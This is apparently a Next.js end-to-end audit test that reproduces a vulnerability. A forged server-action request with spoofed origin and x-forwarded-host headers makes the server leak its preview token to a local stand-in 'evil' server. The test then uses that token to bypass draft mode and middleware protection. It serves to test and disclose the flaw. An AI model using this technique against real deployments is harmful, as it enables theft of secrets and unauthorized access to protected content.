import http from 'http'
import type { AddressInfo } from 'net'
import { nextTestSetup } from 'e2e-utils'
import { retry } from 'next-test-utils'

type CapturedActionRequest = {
  headers: Record<string, string>
  postData: string
}

describe('audit-adapter-routing', () => {
  const { next, skipped } = nextTestSetup({
    files: __dirname,
    dependencies: {
      '@next/routing': require('/workspace/packages/next-routing/package.json')
        .version,
    },
    overrideFiles: {
      'next.config.js': `/**
 * @type {import('next').NextConfig}
 */
const nextConfig = {
  adapterPath: require.resolve('./my-adapter.mjs'),
  images: {
    remotePatterns: [
      {
        protocol: 'http',
        hostname: 'localhost',
        pathname: '/**',
      },
    ],
  },
}

module.exports = nextConfig
`,
    },
    skipDeployment: true,
    startCommand: 'node adapter-server.js',
    serverReadyPattern: /- Local:/,
    env: {
      NEXT_TELEMETRY_DISABLED: '1',
      NODE_ENV: 'production',
    },
  })

  if (skipped) {
    return
  }

  let evilServer: http.Server
  let evilOrigin: string
  let evilRequests: string[]
  let evilRequestHeaders: http.IncomingHttpHeaders[]

  beforeAll(async () => {
    const evilHostname =
      new URL(next.url).hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1'

    evilRequests = []
    evilRequestHeaders = []

    evilServer = http.createServer((req, res) => {
      evilRequests.push(req.url || '/')
      evilRequestHeaders.push(req.headers)
      res.writeHead(200, { 'content-type': 'text/plain' })
      res.end('evil server')
    })

    await new Promise<void>((resolve) => {
      evilServer.listen(0, '127.0.0.1', () => resolve())
    })

    evilOrigin = `http://${evilHostname}:${(evilServer.address() as AddressInfo).port}`
  })

  afterAll(async () => {
    await new Promise<void>((resolve, reject) => {
      evilServer.close((err) => {
        if (err) reject(err)
        else resolve()
      })
    })
  })

  async function captureActionRequest(): Promise<CapturedActionRequest> {
    let capturedActionRequest: CapturedActionRequest | undefined

    const browser = await next.browser('/', {
      beforePageLoad(page) {
        page.on('request', (request) => {
          const headers = request.headers()

          if (
            request.method() === 'POST' &&
            headers['next-action'] &&
            new URL(request.url()).pathname === '/'
          ) {
            capturedActionRequest = {
              headers,
              postData: request.postData() ?? '',
            }
          }
        })
      },
    })

    await browser
      .elementById('trigger-public-revalidating-redirect-action')
      .click()

    await retry(async () => {
      expect(capturedActionRequest).toBeDefined()
    })

    if (!capturedActionRequest) {
      throw new Error('Expected to capture a valid server action request')
    }

    return capturedActionRequest
  }

  async function issueForgedActionRequest(
    actionRequest: CapturedActionRequest
  ) {
    const nextUrl = new URL(next.url)
    const evilHost = new URL(evilOrigin).host

    return await new Promise<{
      statusCode: number
      body: string
      headers: http.IncomingHttpHeaders
    }>((resolve, reject) => {
      const req = http.request(
        {
          hostname: nextUrl.hostname,
          port: nextUrl.port,
          path: '/',
          method: 'POST',
          headers: {
            host: nextUrl.host,
            origin: `http://${evilHost}`,
            'x-forwarded-host': evilHost,
            'next-action': actionRequest.headers['next-action'],
            'content-type': actionRequest.headers['content-type'],
            accept: actionRequest.headers.accept,
          },
        },
        (res) => {
          const chunks = []
          res.on('data', (chunk) => chunks.push(Buffer.from(chunk)))
          res.on('end', () => {
            resolve({
              statusCode: res.statusCode || 0,
              body: Buffer.concat(chunks).toString('utf8'),
              headers: res.headers,
            })
          })
        }
      )

      req.on('error', reject)
      req.write(actionRequest.postData)
      req.end()
    })
  }

  it('leaks the preview token and bypasses middleware-protected content in a supported adapter deployment', async () => {
    const draftBaselineRes = await next.fetch('/draft-only')
    const draftBaselineText = await draftBaselineRes.text()

    expect(draftBaselineRes.status).toBe(200)
    expect(draftBaselineText).toContain('draft mode disabled')
    expect(draftBaselineText).not.toContain('DRAFT SECRET PAYLOAD')

    const protectedBaselineRes = await next.fetch('/protected')
    const protectedBaselineText = await protectedBaselineRes.text()

    expect(protectedBaselineRes.status).toBe(401)
    expect(protectedBaselineText).toContain('blocked by middleware')
    expect(protectedBaselineText).not.toContain('TOP SECRET PAYLOAD')

    const actionRequest = await captureActionRequest()
    const prerenderManifest = await next.readJSON(
      '.next/prerender-manifest.json'
    )
    const previewModeId = prerenderManifest.preview.previewModeId as string

    evilRequests.length = 0
    evilRequestHeaders.length = 0

    const actionRes = await issueForgedActionRequest(actionRequest)
    const leakedToken = evilRequestHeaders
      .map((headers) => headers['x-next-revalidate-tag-token'])
      .find((value): value is string => typeof value === 'string')

    expect(actionRes.statusCode).toBeGreaterThanOrEqual(200)
    expect(leakedToken).toBe(previewModeId)
    expect(
      evilRequests.some((requestPath) =>
        requestPath.startsWith('/post-action-landing')
      )
    ).toBe(true)

    const draftBypassRes = await next.fetch('/draft-only', {
      headers: {
        cookie: `__prerender_bypass=${leakedToken}`,
      },
    })
    const draftBypassText = await draftBypassRes.text()

    expect(draftBypassRes.status).toBe(200)
    expect(draftBypassText).toContain('DRAFT SECRET PAYLOAD')

    const protectedBypassRes = await next.fetch('/protected', {
      headers: {
        'x-prerender-revalidate': leakedToken,
      },
    })
    const protectedBypassText = await protectedBypassRes.text()

    expect(protectedBypassRes.status).toBe(200)
    expect(protectedBypassText).toContain('TOP SECRET PAYLOAD')
  })
})
